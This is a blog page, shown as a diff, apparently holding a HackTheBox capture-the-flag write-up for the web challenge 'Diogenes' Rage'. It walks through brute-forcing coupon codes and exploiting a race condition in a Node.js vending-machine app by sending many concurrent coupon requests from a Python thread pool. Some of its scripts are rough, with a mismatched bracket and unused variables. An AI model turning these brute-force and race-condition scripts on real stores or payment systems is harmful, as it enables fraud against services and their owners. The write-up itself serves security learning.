@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>HackTheBox WEB: Diogenes&#39; Rage | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/htb_diogenes_rage/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>HackTheBox WEB: Diogenes&#39; Rage</h1>
+    <time datetime="2022-01-21T18:09:45&#43;02:00">January 21, 2022</time>
+  </header>
+  <h1 id="yoloing">Yoloing</h1>
+<p>Upon connection to the side served by HackTheBox, a guy in a suitcase is seen standing
+next to a vending machine. The vending machine has numerous items that costs less than
+1$ but one that costs $13.37. We could imagine that this is the one we&rsquo;d like to purchase</p>
+<p>In the bottom of the vending machine there&rsquo;s a 1$ coupon code, which we can use. After
+we purchase something, and click the red button on the bottom, we reset our balance, and
+now we have 0$ again. So we cannot just keep using coupon codes. Let&rsquo;s investigate!</p>
+<p><img src="https://cavetownie.github.io/pictures/DiogenesIMG.png" alt="DiogenesIMG"></p>
+<p>We can in the network tab, after playing around with the page a bit, see three interesting calls called &ldquo;apply&rdquo;, &ldquo;purchase&rdquo;, and &ldquo;reset&rdquo;.</p>
+<p><img src="https://cavetownie.github.io/pictures/NetworkAPPLY.png" alt="NetworkAPPLY"></p>
+<p>The JSON-payload for apply is <code>{coupon_code: HTB_100}</code>. Now writing a small script will ensure that there&rsquo;s not any more coupon_codes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> requests
+
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1000</span>):
+    coupon <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;coupon_code&#34;</span>: f<span style="color:#e6db74">&#34;HTB_{x}&#34;</span>)
+    URL <span style="color:#f92672">=</span> URL<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;api/coupons/apply&#34;</span>
+    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(URL, data<span style="color:#f92672">=</span>coupon)
+
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;success&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+        <span style="color:#66d9ef">print</span>(coupon)
+</code></pre></div><h1 id="reading-source-or-attempting">Reading source (or attempting)</h1>
+<p>However this only yielded one coupon, that is HTB_100. Atleast we checked it! The next idea out of the gate, was just to repeatedly send post requests without the reset, that should work! It of course, did not. Now to opening the code actually provided by the challenge, which had not yet been looked at.</p>
+<p>Looking at the JWTHelper we can quickly see that it&rsquo;s generating cryptographically secure cookies..</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jwt</span>    <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;jsonwebtoken&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SECRET</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">69</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>); <span style="color:#75715e">// This is secure!
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+	<span style="color:#66d9ef">async</span> <span style="color:#a6e22e">sign</span>(<span style="color:#a6e22e">data</span>) {
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">sign</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">SECRET</span>, { <span style="color:#a6e22e">algorithm</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;HS256&#39;</span> });
+	},
+	<span style="color:#a6e22e">verify</span>(<span style="color:#a6e22e">token</span>) {
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">verify</span>(<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">SECRET</span>, { <span style="color:#a6e22e">algorithm</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;HS256&#39;</span> });
+	}
+};
+</code></pre></div><p>But why the cookies? Well we didn&rsquo;t explain yet, but the cookies were what was keeping track of the sessions, and making sure that we did not get more coupons
+than we should. We could now look at the index.js, essentially the main.py of javascript (afaik). I added comments to understand the code better, I don&rsquo;t know js:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span>             <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span>        <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>); <span style="color:#75715e">// The Node.JS framework express. Single-Threaded (important later)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">router</span>         <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">JWTHelper</span>      <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../helpers/JWTHelper&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">AuthMiddleware</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../middleware/AuthMiddleware&#39;</span>);
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">db</span>;
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span> =&gt; ({ <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span> });
+
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index.html&#39;</span>);
+});
+
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/purchase&#39;</span>, <span style="color:#a6e22e">AuthMiddleware</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">getUser</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">username</span>)
+		.<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">async</span> <span style="color:#a6e22e">user</span> =&gt; {
+			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">user</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span>) { <span style="color:#75715e">// If user is not defined at the time of purchase, register them, and give them a cookie
+</span><span style="color:#75715e"></span>				<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">registerUser</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">username</span>);
+				<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">balance</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0.00</span>, <span style="color:#a6e22e">coupons</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span> };
+			}
+			<span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">item</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">item</span>) {
+				<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">getProduct</span>(<span style="color:#a6e22e">item</span>)
+					.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">product</span> =&gt; {
+						<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">product</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">undefined</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#34;Invalid item code supplied!&#34;</span>));
+						<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">product</span>.<span style="color:#a6e22e">price</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">balance</span>) {
+							<span style="color:#a6e22e">newBalance</span> <span style="color:#f92672">=</span> parseFloat(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">balance</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">product</span>.<span style="color:#a6e22e">price</span>).<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
+							<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">setBalance</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">newBalance</span>)
+								.<span style="color:#a6e22e">then</span>(() =&gt; {
+									<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">product</span>.<span style="color:#a6e22e">item_name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;C8&#39;</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+										<span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;/app/flag&#39;</span>).<span style="color:#a6e22e">toString</span>(),
+										<span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`Thank you for your order! $</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">newBalance</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> coupon credits left!`</span>
+									})
+									<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">`Thank you for your order! $</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">newBalance</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> coupon credits left!`</span>))
+								});
+						}
+						<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#34;Insufficient balance!&#34;</span>));
+
+					})
+			}
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;Missing required parameters!&#39;</span>));
+		});
+});
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span> =&gt; {
+	<span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>;
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">router</span>;
+};
+</code></pre></div><p>So every time we purchase, if we didn&rsquo;t have a cookie, we&rsquo;d get one. Now every time we used a coupon, we would immediately get a cookie, this cookie knew that
+we had redeemed a coupon, and that meant we could not redeem again. However if we purchase first, our purchase would get cancelled, and we&rsquo;d now have a cookie
+with which we could still redeem coupons for. Now as this is written in a single-threaded language, what would happen if we wrote a multi-threaded post request
+and just requests a lot of redemptions at once? Interesting stuffs.</p>
+<h1 id="atomic-actions-and-race-conditions">Atomic actions and race conditions</h1>
+<p>Atomiticity is a a term used, for essentially saying, that whenever a database operation occures, it must have all operation occuring or nothing. Now if we imagine
+that we have a stream of water flowing down a river, and we decide to put a lot of wood down canals to this river. After the first wood hits the river, it now blocks
+that avenue, now without atomiticity, the other wood would probably just wait for the first wood to move out of it&rsquo;s blockade. However, as it can see that it can&rsquo;t
+do the operation of continuing down the river, atomiticity is out the window, and it just gets sucked up the canal again. It&rsquo;s a bad comparison, but hopefully
+it makes sense. TLDR: If something is occupied, just don&rsquo;t do it. Exploiting this we can do what&rsquo;s called a race condition. Imagine we just request 100 coupon codes
+on a cookie which has not yet had any coupon redeemed. Before it&rsquo;s blacklisted in the database, we should be able to get enough cash to buy the soap and get the flag</p>
+<p>More on race conditions here: [https://www.nodejsdesignpatterns.com/blog/node-js-race-conditions/]</p>
+<p>The final script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Thread
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">from</span> concurrent.futures <span style="color:#f92672">import</span> ThreadPoolExecutor, as_completed
+
+
+url <span style="color:#f92672">=</span> URL<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;api/coupons/apply&#34;</span>
+coupon <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;coupon_code&#34;</span>: <span style="color:#e6db74">&#34;HTB_100&#34;</span>}
+
+url_pur <span style="color:#f92672">=</span> URL<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;api/purchase&#34;</span>
+item <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;item&#34;</span>: <span style="color:#e6db74">&#34;A3&#34;</span>}
+
+r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>post(url_pur, data<span style="color:#f92672">=</span>item)
+<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>cookies)
+
+cook <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Put your JWT: &#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>(URL):
+    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(URL, data<span style="color:#f92672">=</span>coupon)
+
+<span style="color:#66d9ef">with</span> ThreadPoolExecutor(max_workers<span style="color:#f92672">=</span><span style="color:#ae81ff">150</span>) <span style="color:#66d9ef">as</span> executor:
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+        executor<span style="color:#f92672">.</span>submit(connect, url)
+
+<span style="color:#75715e"># Now set the session cookie manually and buy the soap</span>
+</code></pre></div><p>Flag not disclosed.</p>
+
+</article>
+
+
+
+</html>
